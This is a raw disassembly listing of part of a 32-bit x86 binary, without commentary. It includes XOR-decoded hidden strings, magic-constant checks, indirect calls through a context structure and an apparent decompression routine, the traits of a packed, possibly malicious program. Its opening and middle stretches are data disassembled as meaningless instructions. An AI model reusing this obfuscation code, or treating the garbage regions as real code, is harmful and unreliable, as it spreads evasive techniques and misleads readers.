  41f80c:	loope  0x41f7bf
  41f80e:	loopne 0x41f7bf
  41f810:	mov    gs,esi
  41f812:	mov    esp,0xdb65ec36
  41f817:	pop    edx
  41f818:	cmc    
  41f819:	sub    edi,DWORD PTR [edx+0x38]
  41f81c:	inc    edx
  41f81d:	dec    ebp
  41f81e:	inc    esi
  41f81f:	daa    
  41f820:	xchg   ecx,eax
  41f821:	mov    eax,ds:0x2a4bd279
  41f826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f827:	push   ebp
  41f828:	add    BYTE PTR [edi],dl
  41f82a:	data16 sti 
  41f82c:	pushf  
  41f82d:	retf   
  41f82e:	scas   al,BYTE PTR es:[edi]
  41f82f:	mov    bl,0x88
  41f831:	outs   dx,BYTE PTR ds:[esi]
  41f832:	xchg   DWORD PTR [eax-0x2afd817a],esi
  41f838:	push   0xffffffce
  41f83a:	ret    0x6de7
  41f83d:	mov    bh,BYTE PTR [ebx+0x20]
  41f840:	(bad)  
  41f841:	push   ds
  41f842:	add    DWORD PTR [ebp-0x18ba08bb],esi
  41f848:	imul   esp,edx,0x25
  41f84b:	mov    eax,ds:0x7d49d22c
  41f850:	sub    DWORD PTR [ebx-0x1890704e],esi
  41f856:	lods   eax,DWORD PTR ds:[esi]
  41f857:	ret    
  41f858:	(bad)  
  41f85a:	mov    edi,0x51531736
  41f85f:	lods   al,BYTE PTR ds:[esi]
  41f860:	sub    ah,al
  41f862:	push   ss
  41f863:	cmp    eax,0x13a17ca7
  41f868:	or     ah,bl
  41f86a:	sbb    eax,0xed3b412b
  41f86f:	retf   0xb642
  41f872:	sub    eax,0xfaba1645
  41f877:	jb     0x41f8ab
  41f879:	add    BYTE PTR [ebx],ch
  41f87b:	ret    0xd0b
  41f87e:	mov    ecx,0xb900426e
  41f883:	mov    bl,0x8
  41f885:	push   ecx
  41f886:	pop    es
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429d55
  41f8e9:	mov    edx,DWORD PTR ds:0x42af4d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x430a00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x430a40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	mov    esi,0x1c4ff8a0
  41faa9:	and    BYTE PTR [ebp+eax*2-0x52],0x93
  41faae:	sbb    eax,0x5ed17bc3
  41fab3:	je     0x41fab6
  41fab5:	add    BYTE PTR [eax],al
  41fab7:	add    BYTE PTR [ebx+0x3a],al
  41faba:	pop    esp
  41fabb:	inc    esi
  41fabc:	outs   dx,DWORD PTR ds:[esi]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
